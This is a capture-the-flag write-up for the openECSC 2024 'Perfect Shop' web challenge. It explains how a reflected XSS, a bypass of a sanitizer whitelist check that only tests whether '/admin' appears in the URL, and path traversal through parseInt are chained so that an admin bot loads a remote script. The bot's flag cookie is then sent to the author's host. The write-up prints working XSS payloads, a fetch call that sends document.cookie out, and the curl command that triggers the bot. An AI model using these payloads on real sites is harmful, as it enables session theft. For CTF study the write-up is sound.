# Perfect Shop

## Description

```
Do you like perfect things? Check out my new online shop!

Site: http://perfectshop.challs.open.ecsc2024.it
```

## Categories

- `web`

## Provided Files

- `perfectshop.zip`

## Solve Process

The source code provided shows that this is a express app that communicates with a headless browser.
Searching the source code, we stumble across a few things.

```js
app.get('/search', (req, res) => {
    let query = req.query.q || '';

    if (query.length > 50) {
        res.locals.errormsg = 'Search query is too long';
        query = '';
    }

    const result = products.filter(product => product.name.toLowerCase().includes(query.toLowerCase()));

    res.render('search', { products: result, query: query });
});
```

A search endpoint, with a query directly templated to the page, which points us to a possible `xSS` vulnerability. We can also see a 50 character limit, which will be important later.

So lets confirm our theory and try something trivial.

```
http://perfectshop.challs.open.ecsc2024.it/search?q=%3Cscript%3Ealert(1)%3C/script%3E
```

Aaaaaaaaand it doesn't work sadly. We can see why when further searching the source code.

```js
const sanitizer = require("perfect-express-sanitizer");

// --- snip ---

app.use(sanitizer.clean({ xss: true }, ["/admin"]));
```

This is a sanitizer implementation for express, interestingly with a whitelist entry set to `/admin`. Let's search for it online and examine the implementation a bit.

```js
function middleware(
  options = {},
  whiteList = [],
  only = ["body", "params", "headers", "query"]
) {
  return (req, res, next) => {
    only.forEach((k) => {
      if (req[k] && !whiteList.some((v) => req.url.trim().includes(v))) {
        console.log(req.url)
        console.log(whiteList)
        req[k] = sanitize.prepareSanitize(req[k], options);
      }
    });
    next();
  };
}
```

And surely enough it stands out that the whitelist is checked with a simple `includes()` statement. This means that we could theoretically place `/admin` anywhere in our payload and it should technically work. So lets try it.

```
http://perfectshop.challs.open.ecsc2024.it/search?q=%3Cimg%20src=/admin%22%20onerror=%22alert(%271%27)%22/%3E
```

And this suddenly fires an alert. Great, now we know that this sanitizer is able to be bypassed.

Let's examine the source code a bit further.

```js
app.post('/report', (req, res) => {
    const id = parseInt(req.body.id);
        if (isNaN(id) || id < 0 || id >= products.length) {
        res.locals.errormsg = 'Invalid product ID';
        res.render('report', { products: products });
        return;
    }

    fetch(`http://${HEADLESS_HOST}/`, { 
        method: 'POST', 
        headers: { 'Content-Type': 'application/json', 'X-Auth': HEADLESS_AUTH },
        body: JSON.stringify({ 
            actions: [
                {
                    type: 'request',
                    url: `http://${WEB_DOM}/`,
                },
                {
                    type: 'set-cookie',
                    name: 'flag',
                    value: FLAG
                },
                {
                    type: 'request',
                    url: `http://${WEB_DOM}/product/${req.body.id}`
                },
                {
                    "type": "sleep",
                    "time": 1
                }
            ]
         })
```

A cookie is set containing the flag, which is probably the thing we want to aquire.

The id is parsed as an int, which is pretty cool since that is easily trickable since JavaScript will parse everything as a `int` even if there is a payload attached to it.

```bash
node > console.log(parseInt('1/../../some/payload'));
1
```

The confidence to exploit this comes from the direct inclusion of the `req.body.id` in the `url` property. This allows us to navigate to the webroot and to the exploitable `/search`.

So we would need to modify our payload a bit to accomodate for this, as well as to tell the script to send us cookies, by accessing `document.cookies`.

```
http://perfectshop.challs.open.ecsc2024.it/product/1/../../search?q=%3Cscript%3Efetch(`http://k1f0.dev/?cookies=${document.cookie}`)%3C/script%3E
```

But hold up, this totally runs into the 50 character limit right? Of course it does. Luckily though, I own a relatively short domain, which we'll use to load our payload remotely.

I basically uploaded a file named simply `admin` into my webroot, which contains the payload needed for sending me the cookie data back.

```js
fetch(`http://k1f0.dev/?cookies=${document.cookie}`)
```

Now we only need to load this using the `<script>` attribute and we should be good to go. I crafted a humongous `curl` command for this purpose.

```bash
curl -v -X POST \
-d "id=1/../../search?q=%3Cscript%20src='https://k1f0.dev/admin'%3E%3C/script%3E&message=/admin" \
http://perfectshop.challs.open.ecsc2024.it/report
```

But when trying this, it still doesn'T work. Remember the sanitizer from before? Since this is a new query, we also need to add our workaround to make the sanitizer think we are whitelisted properly.

This can be done simply by prefixing the correct entry and trying again

```bash
curl -v -X POST \
-d "id=1/../../search?q=%3Cscript%20src='https://k1f0.dev/admin'%3E%3C/script%3E&message=/admin" \
http://perfectshop.challs.open.ecsc2024.it/report?q=/admin
```

And surely enough, once this went through, I saw a new entry in my servers `NGINX` log file.

```
- - "GET /?cookies=openECSC%7B4in't_s0_p3rfect_aft3r_4ll%7D HTTP/1.1" 200 3607 "http://perfectshop.challs.open.ecsc2024.it/" "firefox-headless-agent"
```

And that is a solve.
